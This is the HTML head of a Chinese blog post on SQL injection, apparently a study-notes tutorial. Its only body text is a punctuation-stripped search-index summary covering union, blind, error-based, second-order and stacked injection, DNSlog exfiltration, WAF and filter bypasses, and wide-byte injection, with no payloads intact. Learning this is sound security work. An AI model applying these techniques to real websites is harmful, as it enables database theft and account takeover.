<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>浅析sql注入 | hybcx</title><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="浅析sql注入"><meta name="application-name" content="浅析sql注入"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="浅析sql注入"><meta property="og:url" content="http://hybcx.xyz/2023/08/06/qian-xi-sql-zhu-ru/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="SQL注入总结 sql的注入可以分为数字类型，字符类型。 方法1： 首先我们可以使用(转义字符)来判断SQL注入的闭合方式。 原理，当闭合字符遇到转义字符时，会被转义，那么没有闭合符的语句就不完整了，就会报错，通过报错信息我们就可以推断出闭合符。 分析报错信息：看\斜杠后面跟着的字符，是什么字符，它"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="SQL注入总结 sql的注入可以分为数字类型，字符类型。 方法1： 首先我们可以使用(转义字符)来判断SQL注入的闭合方式。 原理，当闭合字符遇到转义字符时，会被转义，那么没有闭合符的语句就不完整了，就会报错，通过报错信息我们就可以推断出闭合符。 分析报错信息：看\斜杠后面跟着的字符，是什么字符，它"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2023/08/06/qian-xi-sql-zhu-ru/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: '浅析sql注入',
  postAI: '',
  pageFillDescription: 'SQL注入总结, 0x01 什么是SQLI, 0x02 sql注入的产生, 注 web程序结构, 2.1 字符型注入, 2.2 数字型注入, 0x03 按照请求方法分, 3.1 GET型注入, 3.2 POST型注入, 3.3 url注入, 3.4 请求头注入, 0x04 按照有无回显分, 4.1 注入步骤, 4.2 有回显, 4.2.1 联合查询注入, 4.2.2 盲注, 布尔盲注, 时间盲注, 4.2.3 报错注入, updatexml注入, extractvalue注入, 主键重复报错, 几何函数注入, 基于溢出的注入, 4.2.4 二次注入(二阶注入), 4.2.5 堆叠注入, 4.2.6 小tip mysql长字符截断, 4.3无回显, 4.3.1 DNS Log, DNSlog 介绍, DNSlog回显原理, DNSlog 应用, DNSlog回显注入条件, DNSlog-sql注入, 0x05 SQLI防御及绕过, 5.1 嵌套及大小写混淆绕过, 5.2 空格被过滤的绕过, 5.3 逗号被过滤的绕过, 5.4 空字节绕过（也就是%00截断）, 5.5 编码绕过, 5.6 引号被转义, 背景知识, 5.7 HTTP参数污染, 5.8 预编译绕过, 5.8.1 简介, 5.8.2 模拟预编译, 5.8.3 绕过, 5.8.3.1 预编译使用错误, 5.8.3.2 部分参数不可预编译, 5.8.3.3 预编译实现错误, 5.9 绕过or和and的, 5.10 绕过空格和注释符, 0x06 Mysql常见函数, 0x07 数据库检测, 7.1 MySQL, 7.2 Oracle, 7.3 SQLServer, 7.4 PostgreSQL注入总结的注入可以分为数字类型字符类型方法首先我们可以使用转义字符来判断注入的闭合方式原理当闭合字符遇到转义字符时会被转义那么没有闭合符的语句就不完整了就会报错通过报错信息我们就可以推断出闭合符分析报错信息看斜杠后面跟着的字符是什么字符它的闭合字符就是什么若是没有就为数字型方法首先尝试结果一如果都报错判断闭合符为整形闭合结果二如果单引号报错双引号不报错继续尝试结果无报错判断闭合符为单引号闭合结果报错判断闭合符可能为单引号加括号结果三如果单引号不报错双引号报错继续尝试结果结果无报错判断闭合符为双引号闭合结果报错判断闭合符可能为双引号加括号注意这里的括号不一定只有一个闭合符里是允许多个括号组合成闭合符的具体要判断有多少个括号可以使用二分法来快速判断判断是否存在注入点通过或者查看页面状态之类的凭感觉是否有注入有的话判断闭合方式判断闭合方式常规闭合奇葩闭合方式一个和两个通过和来判断是否执行了我们输入的语句靶场经验我会经常通过延时判断来闭合个人习惯然后一步一步找闭合方式只要能闭合成功其它都好说什么是所谓注入就是用户在能够控制查询更新插入删除等语句的参数的情况下攻击者通过构造特殊的输入字符串使后端程序错误地识别查询语句中的代码与数据部分从而导致数据库管理系统输出了非预期的结果的一种行为注入本质上来讲就是拼接字符串通过输入额外的信息破坏外后端脚本原有的查询语句结构从而达成注入的目的攻击者构造的查询参数在语句中没有被当作一个字符串对待而是具有了实际的功能特性这是的语法决定的它只是简单地将用户的输入与后端预定义的语句做了一个拼接将拼接的结果整体作为一条的查询语句正是这个特性导致了注入的产生注入的产生注程序结构三层架构通常意义上就是将整个业务应用划分为界面层业务逻辑层数据访问层用户能够直接使用的都是在表示层在表示层输入自己要访问的内容输入的内容传递到业务逻辑层进行处理并将处理后的数据写入到数据库中同理需要请求的内容从数据库中查询出来后在业务逻辑层进行业务逻辑处理之后呈现在表示层以上两步就是一个正常的请求和响应过程注入就是因为业务逻辑层没有做安全过滤到时了从表示层传递过来的数据修改了正常的语句结构从而达到了黑客自身的攻击目的字符型注入当我们传入的参数在后端代码中被引号引起来的时候我们称这种情况为字符型注入看下面的例子字符型注入字符型注入最关键的是如何闭合语句以及注释多余的代码注数据库不同字符串连接符不同的连接符为连接符为连接符为空格数字型注入我们传入的参数在后端代码中没有被引起来的时候我们称这种情况为数字型注入当然之后参数类型为数字的时候才存在区分数字型和字符型的情况此时我们传入的参数直接与进行比较进行注入的首要操作就是对注入类型进行判断即对语句的闭合方式进行判断按照请求方法分型注入所谓型注入顾名思义即注入点的参数是同通过请求发送到后端进行处理的其又可以分为下面两种情形型注入同理是不同于的另一种传参方式大多出现在各种框处比如登录框查询框和各种与数据库有交互的框注入和注入基本没有本质的区别除了在宽字节注入方面的操作有所区别基本操作一致注入即注入点在中举个例子现在有一个网页实现了根据学生学号来查询学生基本信息的功能学生的信息是通过方法传参发送到后端的其请求的如下后台处理代码如下在该例中我们通过修改中的参数的值来控制前端页面的显示结果因为没有过滤的原因我们输入的任何参数值都将被直接拼接到查询语句中那么我们就可以通过联合查询注入的方式进行注入请求头注入简单理解就是注入点在请求头中还是上面的例子不过中的参数被后端进行了严格的过滤不存在任何的注入方法但后端在进行处理的时候不仅仅是使用了查询语句还对我们请求头中的字段在数据库中进行了查询来防止恶意爬虫但憨憨程序员却没有对用户的请求头做过滤于是乎我们可以在请求头中构造恶意代码同理不只是字段其他字段包括等都可以进行注入后端处理逻辑如下请不要恶意浏览本网页可以看到后端代码中并没有对字段做过滤那么我们就可以直接开始构造注入语句按照有无回显分注入步骤判断注入点是否存在首先我们需要判断注入点是否存在如果在页面的中存在某些参数比如下面这个中就存在一个参数我们就可以尝试改变的数值将参数值或然后查看页面展示的内容是否会变化如果页面会发生变化则我们就可以初步判断这个会带入数据库查询查询后的内容会显示到页面中来猜测查询的语句大致为表名常见注入点参数文件名接下来我们就可以进行测试看看我们传入的参数是否会被带入数据库查询测试的方法如下这里也称为脱库即拿出数据库里面的数据添加单引号添加了单引号之后如果页面中直接进行了报错并且报错的信息显示到了页面中来说明我们输入的单引号被带入了数据库查询我们就可以直接判断此处存在注入漏洞并且结合之前判断的页面是否有回显就可以尝试进行联合查询注入或是报错注入添加逻辑运算添加和在添加逻辑运算之前我们需要判断或者猜测注入点的数据类型和闭合方式并对语句进行相应的引号括号闭合比如字符型我们可以直接添加而单验号闭合的字符型我们就需要添加或使用注释符号将后面的引号直接注释掉添加了逻辑运算符之后提交因为恒为真而恒为假所以如果我们的输入带入了数据库一定会影响到语句的布尔状态如果两次查询返回的页面不同说明页面存在布尔状态此处存在注入漏洞可以考虑使用布尔盲注进行注入添加函数函数可以让程序在当前位置停留指定的时间于是我们可以通过观察页面相应的时间来判断我们插入的参数是否会被带入数据库执行在参数后添加然后观察页面响应时间是否明显变长或直接在开发者工具中网络选项卡下观察页面的响应时间如果页面响应时间确实按照我们的要求增加了秒则说明此处存在注入漏洞我们可以考虑通过延时注入在这里我们需要知道我们构建语句时当前面的查询语句为假也就是数据不存在时之后查询出的结果就会显示在页面中这里我们可以通过在前面查询语句中添加使语句变假也可以直接将传入一个负数来使语句变假判断闭合符判断列数联合查询会将两条查询语句的查询结果拼接到一起返回于是反映出联合查询需遵守的一个规则便是两条查询语句的查询字段数必须相等于是乎在利用联合查询进行注入的时候我们第一步要做的就是判断判断后端代码中的查询语句的字段数数字通过页面状态查看有几列然后通过判断回显位注意判断回显位的时候前面查询的值要为假不然回显位会被前面查询的结果所占用导致看不到回显位靶场经验如果被过滤了可以通过来判断或者这两的列数查询判断网页状态查数据库名注意和的区别显示重复的值而不显示重复的值当用不了的时候可以通过来查询注意此处的值必须是一个在数据库中字段不存在的值否则联合查询第一条语句的查询结果将占据显示位我们需要的第二条查询语句的查询结果就不能正常显示到浏览器中查表名假如上一步查询出来的数据库名为注意第二条查询语句我们插入位置的字段一定要在前端有回显否则我们将不能查看到查询结果查列名假如上一步查询出来的表名中有表查数据假如上一步查询出来的字段有与有回显联合查询注入库简介库是自带的一个库其中包含了当前数据库管理系统的所有信息但该数据库并不是一个实体的数据库它不存储任何实际意义上的数据它只是整个数据库管理系统的一个视图当某个数据库的某个表发生变化时库中相关的数据将同时发生变化在注入中我们关注的是该库中的三个表他们分别存储了整个数据库管理系统的所有数据库信息表信息字段信息在表中通过字段可以获取所有的数据库名在通过字段可以获取所有的表名与其对应的数据库名在表中通过字段可以获取所有的字段名以及其所属表与数据库我们的注入思路就是先通过的内建函数获取当前数据库名再通过表获取所有的表信息再通过表获取上述表所有的字段最后通过字段查询想要的数据当然使用库查询信息有一个很重要的条件限制那就是需要当前连接数据库的用户具有读该数据库的权限应用场景连续的几个查询的字段数一样且列的数据类型转换相同就可以查询数据注入点有回显只有最后一个子句允许有只有最后一个子句允许有注入的流程确定列数查看返回点选取可以显示数据的位置读库读表读数据可执行任意语句注意为什么能确定列数的作用为根据一列或者多列的值按照升序或者降序排列数据当超出表的列数时发生报错为什么需要确定列数内部的语句必须拥有相同的列可用二分快速查找盲注盲注又分为布尔盲注与时间盲注两种类型布尔盲注基本原理是通过控制通过连接起来的子句的布尔值来控制页面的显示结果来判断后子句的真实性盲注适用于判断的结果能够回显在界面内容中的情况例如界面文本的变化举个例子根据的特性当运算符左边的计算结果为真时会继续判断后边的运算结果如果右边的结果也为真则整个语句为真当右边的语句为假时则整个语句为假当左边的运算结果为假时则直接判断整个语句为假举例如下为继续判断的结果为整体为为继续判断的结果为整体为为直接判断整体为不再对右边的内容进行判断为直接判断整体为不再对右边的内容进行判断利用的这个特性恒为真的时候右边子句的执行结果将直接影响这个查询语句的结果即子句为真整个查询语句为真页面正常回显内容当子句为假的时候整个查询语句为假页面不正常回显内容在上面我们构造的查询语句中对数据库名的第一个字段进行了判断假如判断正确那么接着对第二个字符进行判断直到数据库名的最后一个字符被找出来可以看到这个过程耗时耗力我们要对所有可能的大小写字母数字特殊字符进行枚举所以可以考虑透过自动化脚本的方式来进行判断这里对脚本的编写推荐适用语言其可以很方便的构造请求要获取表名字段名数据只需将上述替换为对应即可如要获取表名判断数据库名字长度判断数据库名判断表的个数判断表的名字判断列的个数判断列的名字判断用户名和密码的个数判断用户名和密码当然在不对进行判断的情况下可以换为时间盲注时间盲注与布尔盲注有异曲同工之妙只不过判断语句正确与否的标志不再是查询结果有没有被正确得回显而是网页的响应时间看下面语句上例中通过函数获取了当前数据库的长度并与进行比较如果数据库名长度小于那么则延时秒向后端脚本程序回显查询结果如果数据库名不小于则直接回显结果延时秒的结果表现在客户端就是当前浏览器的标题部分会一直转圈圈然后通过二分法即将上述语句中的改为继续测试如果不小于则在将修改为按照此规律我们逐渐紧逼找到当前数据库名的真正长度数据库名的长度确认之后我们就要开始获取数据库名的值了通过上述布尔盲注中讲到的方法最终获取到数据库名当然上面的语句我们还有其他的变种如通过码来比较通过十六进制值来比较使用函数代替和是等效的截取左边两个个字符截取右边两个字符要获取表明字段名数据只需将上面中的替换为联合查询注入中的即可如要获取表名则构造如下语句长度名字长度名字个数长度列名多少个用户名用户名或者密码的长度每个用户名和密码的名字函数此函数为截取字符串一部分函数用法为字符串为起始位置为长度注意中的是从开始的例通过右侧字母的改变和表达式的真假判断库名函数此函数用法从左侧截取的前位例通过右侧字母的改变和表达式的真假判断库名报错注入报错注入就是利用数据库的某些正常的机制人为得制造错误将查询得结果携带在报错信息中回显到客户端什么场景下有用查询不回现内容但会打印错误信息等语句会打印错误信息前面的不适合语句这种场景的源码是怎样的当执行的语句出错时返回错误信息在错误信息中返回数据库的内容即可实现注入那么实现注入的难点就在于构造语句制造错误让错误中包含数据库内容这里介绍个函数引起报错其他的函数类似注对函数操作时产生了错误注语法导致的错误注语法导致的错误注入函数接受三个参数第一个参数是一个格式的字符串第二个参数是符合语法规范的字符串第三个参数是要替换成的字符串该函数的功能就是从第一个字符串中通过语法选择匹配的部分替换成第三个参数的内容并且当语法出现错误的时候将会回显数据于是我们将我们的查询语句放到第二个参数中作为错误回显的一部分外带到客户端浏览器比如需要获取库名则构造如下语句可以被替换为如果为则还有一处需要修改请自行思考我估计是改为即可注意是必须的也是必须的否则将不会回显错误信息可以被别的十六进制数代替但是有限制的亲们可以自行尝试且位置上的数字转换后必须为字符型只能连接字符串不能连接数字获取表名列名数据的方法参见前文描述这里不再赘述注入该函数与很像但他只接受两个参数且其定义与一样可以被替换为如果为则还有一处需要修改请自行思考主键重复报错看下面的例子子句能够根据一个或多个列对结果集进行分组函数的功能为向下取整函数将根据传入的随机数种子生成一个之间的随机数当传入的种子固定的时候随机数的规律也就固定下来为聚合函数配合子句将对分组字段相同的值进行计数分析上面的例子将要达到的查询效果是从表中根据拼接字段对结果集进行计数输出在上例中函数生成的随机数乘以的范围就是那么再使用函数进行向下取整其值就只能是或者同时因为的特性使得其在进行分组的时候会对后面的字段进行两次运算在进行分组的时候会生成一张虚拟表记录数据那么假设一种情况当进行第一次运算的时候发现虚拟表中没有相同的数据准备进行插入操作但因为函数的随机性导致在第二次运算的时候产生的结果在虚拟表中已经存在那么在插入该数据的时候就会产生主键冲突从而产生报错信息将我们需要的数据通过报错信息外带下例是查询数据库的查询表名的方法如下其他信息的查询方法请自行思考可以总结出来一个模板只需将上面模板中的内容替换成为我们的查询即可与均是字段别名几何函数注入可以使用的几何函数存储任意集合图形的集合存储多个点多边形多个多边形线多条线点构造语法都是这样只要上述函数中的参数不是集合形状数据就会报错有版本限制以上列表中基于集合函数的报错注入在这个中被修复在较后的版本中同样不再生效基于溢出的注入按位取反得到数据的二进制后按位取反自然对数的次方很容易就溢出了后的内容被取反后会得到一个很大的数再做为自然对数的指数得到的值一定会溢出从而报错将查询结果显示出来基于函数的报错注入在后的版本已经不再生效具体可以参考这个二次注入二阶注入二阶注入是指已存在的用户输入的数据被存储到数据库中在用户再次使用该数据的时候导致的注入这种注入类型是很难通过工具扫描或者黑盒测试发现的往往需要通过白盒测试才能发现比如现在有一个网站提供了用户注册与修改密码的功能在用户登录的时候通过函数对用户的输入进行了转义如专有名词白盒测试也称为结构测试主要用于检测软件编码过程中的错误程序员的编程经验对编程软件的掌握程度工作状态等因素都会影响到编程质量导致代码错误黑盒测试又称为功能测试主要检测软件的每一个功能是否能够正常使用在测试过程中将程序看成不能打开的黑盒子不考虑程序内部结构和特性的基础上通过程序接口进行测试检查程序功能是否按照设计需求以及说明书的规定能够正常打开使用登录成功用户名或密码错误两次输入密码不一致可以看到在登录界面用户名与密码被函数做了转义那么我们输入的单引号或者双引号就失去了作用于是我们不能通过简单一次注入获取数据再看用户注册界面的代码当前用户已存在新增用户成功未知错误请检查后再输入两次输入密码不一致可以看到注册界面的输入也被转义了但是有一点需要明确的是经过和转义的字符在插入到数据库中之后会被解转义不然我们注册的用户名就变了利用这个特性我们就可以搞事情了在用户修改密码时由这样的语句首先判断用户名密码是否正确密码修改成功未知错误请检查后再输入两次输入密码不一致或者用户名或者老密码输入错误假如我们知道有一个用户名为的管理员账户那么我们首先可以注册一个的账号根据实际情况确定密码为然后我们正常登录到我们新注册的账号跳转到修改密码的界面然后输入用户名与密码之后点击确认这时候后台的语句变成了所以这时候就修改了账户名为的密码这时候我们就可以用我们的新密码直接登录管理员账户了大家可以到靶场第关进行试验堆叠注入函数堆叠注入从名词的含义就可以看到应该是一堆语句多条一起执行而在真实的运用中也是这样的我们知道在中主要是命令行中每一条语句结尾加表示语句结束这样我们就想到了是不是可以多句一起使用这个叫做堆叠注入在中分号是用来表示一条语句的结束试想一下我们在结束一个语句后继续构造下一条语句会不会一起执行因此这个想法也就造就了堆叠注入而联合注入也是将两条语句合并在一起两者之间有什么区别么区别就在于或者执行的语句类型是有限的可以用来执行查询语句而堆叠注入可以执行的是任意的语句使用条件执行多条查询的函数防止注入改成函数堆叠注入的使用条件十分有限其可能受到或者数据库引擎又或者权限的限制只有当调用数据库函数支持执行多条语句时才能够使用利用函数就支持多条语句同时执行但实际情况中如为了防止注入机制往往使用调用数据库的函数是函数其只能执行一条语句分号后面的内容将不会被执行所以可以说堆叠注入的使用条件十分有限一旦能够被使用将可能对网站造成十分大的威胁我们就可以在普通注入的后面写上一条任意的语句例如插入数据或者删库执行完上述语句我们得知了列名此时我们根据具体列名进行查询删除等语句的执行随后执行可以看到自己成功插入了密码用户名小长字符截断中有一个环境变量配置定义了应该支持的语法数据校验等可以通过以下方式查看当前数据库使用的具体的参数解释见参考资料的模式版本以上支持了三种模式如下默认情况下选择使用的是严格模式此时如果插入的数据超过限制长度则会报错如果超出的长度是由空格引起的可能只会警告实际操作证明三种模式下如果插入的超出长度是由空格引起的并不会报错仅仅会警告本节最后给出结果正常插入限制个字符这里插入个字符后个为空格插入成功出现警告出现截断情况报错提醒超长字符对于的插入可以查看其的长度发现其长度为下面重点讨论当模式为时引起的长字符截断问题首先将设置为模式接下来依次创建插入数据这里发现也插入成功了创建表格正常插入警告插入成功警告插入成功观察一下各个用户的长度可以发现的均被截断长度都变成了如果此时选择会出现下面情况此时我们只查询了用户名为的用户但另外两个长度不一致的用户却出现这会造成安全问题假如某个管理员的用户名就是他采用下面的语句登录此时我们只要伪造用户便可以获得管理员的信息从而进入后台补充对于三种模式下的空格插入溢出并不会报错结果如下由此可见预防长字符截断问题可能需要从其他地方入手如账号由管理员分配并限制更改对数据库内容加密即使获取到相关信息也无法破解假设管理员的账号就是那么我们就去注册一个的用户后面有哦很多空格等待被截取掉就直接替换掉这个账号了也就是我们可以登录账户名为的账号了无回显我们在发起网络请求的时候第一步就是解析域名当域名被成功解析的时候该域名解析结果将被域名服务器记录下来我们利用的正是这一点将我们想要的数据放在域名的下一级域中外带到域名服务器通过查询域名服务器的日志从而获得我们想要的数据如我们使用这个网站来测试命令测试点击获取子域名获取一个包含三级域名的域名给我们这里我们使用命令做测试当通的时候我们点击该网站的刷新记录就可以看到我测试主机的用户名了该注入方法适用于需要时间盲注没有回显的注入场景构造语句如下在到看看是不是获取到了我们的数据库名我们可以看到上面的语句使用了这是路径的表示方法所以在中只适用于平台的服务器路径是在平台上访问局域网网络资源的一种路径表示方法我们在上使用的文件共享服务路径就是通过这种方式这也就解释了为什么只能在平台的服务器上有效另外多出来的两个表示转义受配置文件中选项的限制允许所有允许加载盘拒绝介绍首先我们知道是起与域名的解析的服务通过可以解析到对应的域名就是储存在上的域名相关的信息它记录着你对域名或者的访问信息也就是类似于日志文件回显原理首先了解一下多级域名的概念我们知道因特网采用树状结构命名方法按组织结构划分域是一个名字空间中一个被管理的划分域可划分为子域子域再可被划分为多级域名称为一级域名二级域名三级域名从一个域名地址来从右到左依次是顶级域名二级域名三级域名例如通俗的说就是我有个域名我将域名设置对应的上这样当我向服务器发起的解析请求时中会记录下他给解析解析值为而我们这个解析的记录的值就是我们要利用的地方这个过程被记录下来就是应用布尔盲注时间盲注注入的效率低且线程高容易被拦截又或者是目标站点没有回显可利用无回显的命令执行推荐三个大众化的免费解析记录网站回显注入条件数据库权限数据库可读写权限值为空上期笔记有说明系统注入注册一个解析服务利用唯一标识符以无回显注入为例注入测试需要闭合语句替换标识符利用盲注回显在回显数据时域名能够接受的字符是有条件限制的某些不适合作为域名的特殊字符可能会被屏蔽掉针对这种情况我们也可以编码后再进行请求防御及绕过产生的背景传统防火墙阻断数据包工作网络层服务器功能丰富成为攻击目标应用层由此而生称为应用防火墙他是通过执行一系列针对的安全策略来专门对应用提供保护的一款产品是基于规则的防护可以提供各种应用的安全规则生产商去维护这个规则库并实时为其更新用户按照这些规则可以对应用进行全方面的保护架构层绕过用户本身是进入后访问页面的只要我们找到的真实绕过就不在话下了在同网段内页面与页面之间服务器与服务器之间通过的保护然后展示给我们只要我们在内部服务之间进行访问即可绕过边界漏洞同样类似于同网段数据我们可以利用已知服务器存在的漏洞将数据直接发送给同网段的进行注入资源限制角度绕由于数据太大会导致无法将所有的数据都检测完这个时候会忽略掉我们代入的注入语句从而绕过即使用请求对服务器请求很大资源数据逃逸注入语句协议层面绕过基于协议层有的只过滤请求而对请求没做别的限制因此可以将型换为型文件格式页面仅对为数据格式进行过滤因此我们只要将格式修改为即可绕过参数污染有的仅对部分内容进行过滤例如这样的参数也仅对前部分的进行检测而后面的参数并不做处理这样我们就可以在的后面写入注入语句进行注入规则层面绕等价函数等价符号和不能使用可以尝试下和还有不能使用的情况可以考虑尝试因为如果不小于又不大于那便是等于逻辑异或可以特殊符号使用反引号例如可以用来过空格和正则特殊情况下还可以将其做注释符用可以缓冲区溢出允许每个字符前面添加一个号嵌套及大小写混淆绕过如果后台存在这样的语句将替换为空或者将替换为空且不区分大小写我们可以这样构造上面两种用法均可这样绕过函数时不区分大小写的我们还可以通过来绕过空格被过滤的绕过通过内内联注释部分程序过滤了空格将输入限制为单个则可以通过内联注释绕过还可通过绕过这里中间部分的符号因题而异可能会有字符的过滤需要一个一个尝试或者爆破通过括号基本没啥用就当作语句的拓展吧倒是可以跟报错注入利用毕竟报错注入需要的空格少通过括号代替空格有点鸡肋关键字是不能被括起来的否则会报错比如不能写作基本没啥用逗号被过滤的绕过作用也不大用到逗号的地方很多如要查两个字段这里的逗号就不能这样写当然我们可以每次只查一个字段空字节绕过也就是截断用于绕过一些入侵检测系统如等这些检测系统一般都是用原生语言编写的而这些语言检验字符串的结尾是通过检测空字节在被检测系统检测的字符前面加上一个空字节就可以欺骗检测系统忽略被检测字符空字节编码绕过我们可以通过编码的方式欺骗后端的过滤机制进制编码引号被转义背景知识字符集在了解宽字节注入之前我们先来看一看字符集是什么字符集也叫字符编码是一种将符号转换为二进制数的映射关系几种常见的字符集编码单字节编码编码单字节编码编码使用一字节和双字节编码范围内是一位和保持一致双字节的第一字节范围是编码使用一至四字节编码范围内是一位和保持一致其它字符用二至四个字节变长表示宽字节就是两个以上的字节宽字节注入产生的原因就是各种字符编码的不当操作使得攻击者可以通过宽字节编码绕过注入防御编码是在标准基础上的内码扩展规范使用了双字节编码方案其编码范围从至剔除共个码位共收录了个汉字完全兼容标准支持国际标准和国家标准中的全部中日韩汉字并包含了编码中的所有汉字摘自百度百科字符反斜线的码值是占用一个字节编码方式可以将反斜线转换为一个服务器数据库不识别的汉字即在前面拼接组合一个字符那么数据库就会将转换为一个不识别的汉字这样数据库就会将其忽略掉宽字节注源于程序员设置连接时错误配置为这样配置会引发编码转换从导致的注漏洞具体原理如下正常情况下当开启或使函数过滤或提交的参数时客使的单引号就会被转义为但如果存在宽字节注我们输时先经过上提到的单引号转义变成了是反斜杠之后在数据库查询前由于使了多字节编码即在汉字编码范围内两个字节会被编码为个汉字然后服务器会对查询语句进编码即转换成了汉字運单引号逃逸了出来从造成了注漏洞编码导致宽字节注编码是数据库编码跟前台的编码关转原理其实跟前原理说的第条是样的我们输时先经过上提到的单引号转义变成了是反斜杠然后正好属于的汉字编码范围经过转换到编码转换后变成了汉字運从吞掉了反斜杠使得单引号逃脱出来转这我们思考下錦这个字它的编码是它的编码是上提到过反斜杠正好为所以如果我们将设置为錦先经过函数或对单引号转义变为錦然后会经过函数会对錦转化为编码最后就是反斜杠被转义了从单引号逃逸出来就会引发注漏洞假设当前数据库使用编码集数据库会将输入的参数解析为两个字节其中为高位字节编码位是为低位字节编码位是的编码取值范围就是第一个字节是第二个字节是数据库会按照编码将解析成一个汉字这样就会失去原来的作用在上图中数据库将参数按照编码集解析成上图中的汉字運这种方式就是宽字节注入宽字节注入有前提要求目标数据库的编码方式是编码并且客户端必须和数据库的编码方式一致这样才能使用宽字节注入方式宽字节注入过程如下所示为了突破这个防护我们可以使用宽字节注入的方式来进行突破使用当我们在单引号之前加上的时候也就是输入这样传入到数据库中就会变成原理是在编码中与的转义符结合会编码成一个汉字这样就使得逃逸了此外也都是可以的传入时返回结果出现此处是不存在注入漏洞的但是有一个特例就是当数据库编码为时可以使用宽字节注入宽字节的格式是在地址后加一个再加单引号因为反斜杠的编码为而再编码中为一个繁体字此时查询就会出错一般结合注入使用查看输出位置查询表名时一般使用语句查询列名的时候会有所不同因为对单引号进行了过滤还有一些例如注入注入和注入类型相似不一一讲解了参数污染客户端在访问服务器端时需要先经过一个服务器这个服务器